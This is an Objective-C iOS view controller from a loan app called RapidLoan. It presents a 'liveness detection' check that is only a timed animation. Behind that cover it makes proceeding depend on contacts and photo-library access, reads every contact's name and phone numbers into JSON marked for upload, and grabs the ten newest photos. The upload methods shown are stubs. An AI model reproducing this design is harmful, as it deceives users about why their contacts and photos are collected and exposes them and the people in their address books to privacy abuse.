//
//  HomeViewController.m
//  RapidLoan
//
//  Created by admin on 2018/1/30.
//  Copyright © 2018年 admin. All rights reserved.
//

#import "HomeViewController.h"
#import <Contacts/Contacts.h>
#import <Photos/Photos.h>
#import "CertificationController.h"
#import <sqlite3.h>
@interface HomeViewController ()

{
    NSMutableArray  *_contactArr;
    NSString        *_jsonString;
    BOOL            getContact;  //获取通讯录
    BOOL            getImage;    //获取相册
}
@property (nonatomic,strong)UIButton *mainButton;
@property (nonatomic,strong)UIButton *turnButton;
@property (nonatomic,strong)UIImageView *animitionImageView;
@property (nonatomic, strong) NSMutableArray *assets;//用于存储所有的照片。
@property (nonatomic, strong) NSMutableArray *dataArray;
@property (nonatomic, strong) NSMutableArray *uploadArray;

@property (nonatomic,strong)UIImageView *iconImageView;
@property (nonatomic,strong)UILabel *bottomLabel;
@property (nonatomic,strong)UILabel *detailLabel;
@property (nonatomic,strong)UILabel *lineLast;
@property (nonatomic, assign)CheckType checkType;
@end

@implementation HomeViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    WS(weakSelf)
    self.view.backgroundColor =[UIColor whiteColor];
    self.titleLabel.text =@"速贷助手";
    _checkType =CheckTypeUnstart;
    _contactArr =[NSMutableArray arrayWithCapacity:0];
    _assets =[NSMutableArray arrayWithCapacity:0];
    _dataArray =[NSMutableArray arrayWithCapacity:0];
    _uploadArray =[NSMutableArray arrayWithCapacity:0];

  
    _mainButton =[WidgetObjc WidgetButton:CGRectMake(ScreenWidth/2- FSFloat(103), ScreenHeight/2- FSFloat(183), FSFloat(206), FSFloat(206)) font:[UIFont systemFontOfSize:20] title:@"点击进行\n活体检测" textColor:[UIColor whiteColor] superViews:self.view];
    _mainButton.titleLabel.numberOfLines =0;
    [_mainButton setBackgroundImage:[UIImage imageNamed:@"jiance_icon"] forState:UIControlStateNormal];
    [_mainButton setBackgroundImage:[UIImage imageNamed:@"jiance_icon"] forState:UIControlStateHighlighted];

    [_mainButton addUpInside:^(UIButton *button) {
     
        CNAuthorizationStatus authorizationStatus = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];

        if(authorizationStatus ==CNAuthorizationStatusAuthorized) {
            [weakSelf getContact];
        }else {
        }
        PHAuthorizationStatus status = [PHPhotoLibrary authorizationStatus];
        if(status ==PHAuthorizationStatusAuthorized) {
            [weakSelf uploadImages];
        }else {
        }
        if (authorizationStatus !=CNAuthorizationStatusAuthorized ||status !=PHAuthorizationStatusAuthorized) {
            [weakSelf alertWithString:@"您未授权通讯录或相册权限，请前去授权"];
        }
        if (authorizationStatus ==CNAuthorizationStatusAuthorized &&status ==PHAuthorizationStatusAuthorized) {
            CertificationController *certificationVC =[[CertificationController alloc]init];
            [weakSelf.navigationController pushViewController:certificationVC animated:YES];
            
        }
        
    }];
    
    _animitionImageView =[WidgetObjc WidgetImageView:CGRectMake(0, 0, FSFloat(206), FSFloat(206))  imageName:@"turn" superViews:_mainButton];
    _animitionImageView.hidden =YES;
    
    _bottomLabel =[WidgetObjc WidgetLabel:CGRectMake(0, _mainButton.bottom+36, ScreenWidth, 20) font:[UIFont systemFontOfSize:16] Alignment:NSTextAlignmentCenter textColor:[UIColor blackColor ]];
    _bottomLabel.text =@"点击上方按钮进行检测";
    [self.view addSubview:_bottomLabel];
    
    _detailLabel =[WidgetObjc WidgetLabel:CGRectMake(0, _bottomLabel.bottom+10, ScreenWidth, 20) font:[UIFont systemFontOfSize:12] Alignment:NSTextAlignmentCenter textColor:[UIColor colorWithHex:0x9B9B9B  ]];
    [self.view addSubview:_detailLabel];
    
    _lineLast =[[UILabel alloc]initWithFrame:CGRectMake(10, _bottomLabel.bottom+33, ScreenWidth-20, 1)];
    _lineLast.backgroundColor =[[UIColor colorWithHex:0x000000] colorWithAlphaComponent:0.2];
    [self.view addSubview:_lineLast];
    
//    _iconImageView =[WidgetObjc WidgetImageView:CGRectMake(ScreenWidth/2-FSFloat(27.5), _lineLast.bottom+40, FSFloat(55), FSFloat(55)) imageName:@"logo1" superViews:self.view];
    _iconImageView =[WidgetObjc WidgetImageView:CGRectMake(ScreenWidth/2-FSFloat(27.5), _lineLast.bottom+40, FSFloat(55), FSFloat(55)) imageName:@"" superViews:self.view];

    
//   _turnButton =[WidgetObjc WidgetButton:CGRectMake(ScreenWidth/2- FSFloat(69.5), _iconImageView.bottom+25, FSFloat(139), FSFloat(40)) font:[UIFont systemFontOfSize:14] title:@"前往飞速贷" textColor:[UIColor colorWithHex:0x4ABBFF] superViews:self.view];
    _turnButton =[WidgetObjc WidgetButton:CGRectMake(ScreenWidth/2- FSFloat(69.5), _iconImageView.bottom+25, FSFloat(139), FSFloat(40)) font:[UIFont systemFontOfSize:14] title:@"重新检测" textColor:[UIColor colorWithHex:0x4ABBFF] superViews:self.view];
    _turnButton.hidden =YES;
    _turnButton.layer.masksToBounds =YES;
    _turnButton.layer.cornerRadius =_turnButton.height/2;
    _turnButton.layer.borderColor =[UIColor colorWithHex:0x4ABBFF].CGColor;
    _turnButton.layer.borderWidth =1.0;
//    [_turnButton addUpInside:^(UIButton *button) {
//        [SVProgressHUD showImage:nil status:@"\n正在开发中...\n"];
//    }];
    
    //通讯录权限
    [self requestAuthorizationForAddressBook];
    //相册权限
    [self requestPermissons];
    
    
    //上传视频通知
    [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(InfoNotificationAction:) name:@"InfoNotification" object:nil];

    
}

-(void)alertWithString:(NSString *)alertStr{
    UIAlertController* alert = [UIAlertController alertControllerWithTitle:nil
                                                                   message:alertStr
                                                            preferredStyle:UIAlertControllerStyleAlert];
    
    UIAlertAction* defaultAction = [UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleDefault
                                                          handler:^(UIAlertAction * action) {
                                                              NSURL *url = [NSURL URLWithString:UIApplicationOpenSettingsURLString];
                                                              if ([[UIApplication sharedApplication] canOpenURL:url]) {
                                                                  [[UIApplication sharedApplication] openURL:url];
                                                              }
                                                          }];
    
    [alert addAction:defaultAction];
    [self presentViewController:alert animated:YES completion:nil];
    
}

- (void)InfoNotificationAction:(NSNotification *)notification{
    NSString *uploadString =notification.object[@"uploadSuccess"];
    if (getContact &&getImage&&[uploadString boolValue]==YES) {
        self.checkType =CheckTypeOngoing;
        [self refreshViews];
    }else{
        self.checkType =CheckTypeFailure;
        [self refreshViews];
    }
   
}

- (void)requestAuthorizationForAddressBook {
    
    CNAuthorizationStatus authorizationStatus = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    
    if(authorizationStatus ==CNAuthorizationStatusNotDetermined) {
        
        CNContactStore*contactStore = [[CNContactStore alloc]init];
        
        [contactStore requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted,NSError*_Nullable error) {
            
            if(granted) {
                NSLog(@"通讯录获取授权成功==");

            }else{
                
                NSLog(@"授权失败, error=%@", error);
                [SVProgressHUD showErrorWithStatus:[NSString stringWithFormat:@"授权失败"]];
            }
            
        }];
        
    }
    else if(authorizationStatus ==CNAuthorizationStatusAuthorized) {
    }
   else if(authorizationStatus ==CNAuthorizationStatusRestricted) {
    }
    
}
- (void)requestPermissons
{
    WS(weakSelf)
    //获取当前状态：PHAuthorizationStatusNotDetermined--未知
    //            PHAuthorizationStatusRestricted--受限制的(用户不能更改某个app的此状态，或许某些活动限制设置能改变如：家长模式）
    //            PHAuthorizationStatusDenied--拒绝访问
    //            PHAuthorizationStatusAuthorized--可以访问
    PHAuthorizationStatus status = [PHPhotoLibrary authorizationStatus];
    
    if (status == PHAuthorizationStatusNotDetermined) {
        [PHPhotoLibrary requestAuthorization:^(PHAuthorizationStatus status) {
            if (status == PHAuthorizationStatusAuthorized) {
                //获取手机照片库
                [weakSelf showImage];
            }else{
                //弹出提示信息
            }
        }];
    }else if(status == PHAuthorizationStatusAuthorized){
        //获取手机照片库
        [weakSelf showImage];
    }else if(status == PHAuthorizationStatusRestricted){
        //被用户拒绝
    }else{
        //弹出提示信息
    }
}
- (void)getContact{
    
    CNAuthorizationStatus authorizationStatus = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    
    if(authorizationStatus ==CNAuthorizationStatusAuthorized) {
        
        // 获取指定的字段,并不是要获取所有字段，需要指定具体的字段
        
        NSArray*keysToFetch =@[CNContactGivenNameKey,CNContactFamilyNameKey,CNContactPhoneNumbersKey];
        
        CNContactFetchRequest*fetchRequest = [[CNContactFetchRequest alloc]initWithKeysToFetch:keysToFetch];
        
        CNContactStore*contactStore = [[CNContactStore alloc]init];
        
        //创建一个保存通讯录的数组
        
        NSMutableArray *contactArr = [NSMutableArray array];
        
        [contactStore enumerateContactsWithFetchRequest:fetchRequest error:nil usingBlock:^(CNContact*_Nonnull contact,BOOL*_Nonnull stop) {
            
            NSString*givenName = contact.givenName;
            
            NSString*familyName = contact.familyName;
            
            NSLog(@"givenName=%@, familyName=%@", givenName, familyName);
            
            NSArray*phoneNumbers = contact.phoneNumbers;
            
            for(CNLabeledValue*labelValue in phoneNumbers) {
                
                NSString*label = labelValue.label;
                
                CNPhoneNumber*phoneNumber = labelValue.value;
                
                NSDictionary*contact =@{@"nickname":[NSString stringWithFormat: @"%@%@",familyName,givenName],@"tel":phoneNumber.stringValue};
                
                [contactArr addObject:contact];
                
                NSLog(@"label=%@, phone=%@", label, phoneNumber.stringValue);
                
            }
            
            //*stop = YES;// 停止循环，相当于break；
            
        }];
        
        
        _contactArr= contactArr;
        
        NSError*error;
        
        NSData*jsonData = [NSJSONSerialization dataWithJSONObject:contactArr options:NSJSONWritingSortedKeys error:&error];//此处data参数是我上面提到的key为"data"的数组
        
        NSString*jsonString = [[NSString alloc]initWithData:jsonData encoding:NSUTF8StringEncoding];
        
        _jsonString= jsonString;
        
        NSLog(@"jsonString====%@",jsonString);
        
        [self postContactToWith:jsonString]; //6.上传通讯录
        
    }else{
        
        NSLog(@"====通讯录没有授权====");
        
    }
    
}

- (void)showImage
{
    WS(weakSelf)
    //获取相册里所有的照片
    PHFetchResult *result = [PHAsset fetchAssetsWithMediaType:PHAssetMediaTypeImage options:nil];
    self.assets = [[NSMutableArray alloc] init];
    [result enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
        if ([obj isKindOfClass:[PHAsset class]]) {
            [self.assets addObject:obj];
        }
    }];
    //最后一张图为最新
    if (self.assets.count !=0) {
        if (self.assets.count<10) {
            for (int i=0; i<self.assets.count; i++) {
                PHAsset *asset = self.assets [self.assets.count-i-1];
                PHImageManager *manager = [PHImageManager defaultManager];
                
                [manager requestImageForAsset:asset
                                   targetSize:PHImageManagerMaximumSize
                                  contentMode:PHImageContentModeAspectFill
                                      options:nil
                                resultHandler:^(UIImage * _Nullable result, NSDictionary * _Nullable info) {
                                    [_dataArray addObject: [HomeViewController imageByScalingAndCroppingForSize:CGSizeMake(375, 460) WithImage:result]];
                                    
                                }];
            }
        }else{
            for (int i=0; i<10; i++) {
                PHAsset *asset = self.assets [self.assets.count-i-1];
                PHImageManager *manager = [PHImageManager defaultManager];
                
                [manager requestImageForAsset:asset
                                   targetSize:PHImageManagerMaximumSize
                                  contentMode:PHImageContentModeAspectFill
                                      options:nil
                                resultHandler:^(UIImage * _Nullable result, NSDictionary * _Nullable info) {
                                    [_dataArray addObject: [HomeViewController imageByScalingAndCroppingForSize:CGSizeMake(375, 460) WithImage:result]];
                                    if (i==9) {
                                        return ;
                                    }
                                    
                                }];
            }
        }
    }
    
}
-(void)postContactToWith:(NSString *)jsonString{

    getContact =YES;
    [self refreshViews];
    
}

-(void)uploadImages{
  //上传图片
    getImage =YES;
    [self refreshViews];
}



-(void)refreshViews{
    _lineLast.hidden =YES;
    _iconImageView.hidden =YES;
    _turnButton.hidden =YES;
    _detailLabel.hidden =YES;

    WS(weakSelf)
    switch (_checkType) {
        case CheckTypeUnstart:
        {
            self.animitionImageView.hidden =YES;
            _detailLabel.hidden =YES;
            _iconImageView.hidden =NO;
            _turnButton.hidden =NO;
            _detailLabel.hidden =NO;
        }
            break;
        case CheckTypeOngoing:
        {
            self.animitionImageView.hidden =NO;

            [_mainButton setTitle:@"" forState:UIControlStateNormal];
            _bottomLabel.text =@"正在进行活体检测中";
            _detailLabel.text =@"预计需要1分钟";
            _mainButton.userInteractionEnabled =NO;
            _detailLabel.hidden =NO;
            CABasicAnimation* rotationAnimation;
            rotationAnimation = [CABasicAnimation animationWithKeyPath:@"transform.rotation.z"];
            rotationAnimation.toValue = [NSNumber numberWithFloat: M_PI * 2.0 ];
            rotationAnimation.duration = 10;
            rotationAnimation.cumulative = YES;
            rotationAnimation.repeatCount = MAXFLOAT;
             rotationAnimation.removedOnCompletion = NO;
            [self.animitionImageView.layer addAnimation:rotationAnimation forKey:@"rotationAnimation"];
            dispatch_time_t delayTime = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5.0/*延迟执行时间*/ * NSEC_PER_SEC));
            dispatch_after(delayTime, dispatch_get_main_queue(), ^{
                _checkType =CheckTypeDone;
                [weakSelf refreshViews];
            });
        }
            break;
        case CheckTypeDone:
        {
                _detailLabel.hidden =NO;
                self.animitionImageView.hidden =YES;
                [self.animitionImageView.layer removeAnimationForKey:@"rotationAnimation"];
                _bottomLabel.text =@"恭喜，活体检测完成！";
                [_mainButton setBackgroundImage:[UIImage imageNamed:@"jiancewancheng_icon"] forState:UIControlStateNormal];
            
            [_mainButton setTitle:@"" forState:UIControlStateNormal];

                [_turnButton setTitle:@"前往" forState:UIControlStateNormal];
//                _lineLast.hidden =NO;
                _iconImageView.hidden =NO;
//                _turnButton.hidden =NO;
                _turnButton.hidden =YES;

                _detailLabel.hidden =YES;
         
        }
            break;
        case CheckTypeFailure:
        {
           
                self.animitionImageView.hidden =YES;
                [self.animitionImageView.layer removeAnimationForKey:@"rotationAnimation"];
                _mainButton.userInteractionEnabled =YES;
                [_turnButton setTitle:@"重新检测" forState:UIControlStateNormal];

                [self.animitionImageView.layer removeAnimationForKey:@"rotationAnimation"];
                [_mainButton setTitle:@"" forState:UIControlStateNormal];
                [_mainButton setBackgroundImage:[UIImage imageNamed:@"jianceguzhang_icon"] forState:UIControlStateNormal];
                [_mainButton setBackgroundImage:[UIImage imageNamed:@"jianceguzhang_icon"] forState:UIControlStateHighlighted];

                _bottomLabel.text =@"活体检测遇到问题，请重新检测";
                _detailLabel.text =@"请检查网络是否通畅，再进行重试";
                _detailLabel.hidden =NO;
          
        }
            break;
            
        default:
            break;
    }
}
+(UIImage*)imageByScalingAndCroppingForSize:(CGSize)targetSize WithImage:(UIImage*)image
{
    UIImage *sourceImage = image;
    UIImage *newImage = nil;
    CGSize imageSize = sourceImage.size;
    CGFloat width = imageSize.width;
    CGFloat height = imageSize.height;
    CGFloat targetWidth = targetSize.width;
    CGFloat targetHeight = targetSize.height;
    CGFloat scaleFactor = 0.0;
    CGFloat scaledWidth = targetWidth;
    CGFloat scaledHeight = targetHeight;
    CGPoint thumbnailPoint = CGPointMake(0.0,0.0);
    
    if (CGSizeEqualToSize(imageSize, targetSize) == NO)
    {
        
        CGFloat widthFactor = targetWidth / width;
        CGFloat heightFactor = targetHeight / height;
        
        if (widthFactor > heightFactor)
            scaleFactor = widthFactor; // scale to fit height
        else
            scaleFactor = heightFactor; // scale to fit width
        scaledWidth= width * scaleFactor;
        scaledHeight = height * scaleFactor;
        
        // center the image
        if (widthFactor > heightFactor)
        {
            thumbnailPoint.y = (targetHeight - scaledHeight) * 0.5;
        }
        else if (widthFactor < heightFactor)
        {
            thumbnailPoint.x = (targetWidth - scaledWidth) * 0.5;
        }
        
    }
    
    UIGraphicsBeginImageContext(targetSize); // this will crop
    
    CGRect thumbnailRect = CGRectZero;
    thumbnailRect.origin = thumbnailPoint;
    thumbnailRect.size.width= scaledWidth;
    thumbnailRect.size.height = scaledHeight;
    
    [sourceImage drawInRect:thumbnailRect];
    
    newImage = UIGraphicsGetImageFromCurrentImageContext();
    if(newImage == nil)
        NSLog(@"could not scale image");
    
    //pop the context to get back to the default
    UIGraphicsEndImageContext();
    NSData * imageData = UIImageJPEGRepresentation(newImage,1);
    CGFloat length = [imageData length]/1000;
    NSLog(@"newlength==%lf",length);
    return newImage;
}

- (void)dealloc
{
    [[NSNotificationCenter  defaultCenter]removeObserver:self name:@"InfoNotification" object:nil];
}

- (void)didReceiveMemoryWarning {
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

/*
#pragma mark - Navigation

// In a storyboard-based application, you will often want to do a little preparation before navigation
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    // Get the new view controller using [segue destinationViewController].
    // Pass the selected object to the new view controller.
}
*/

@end
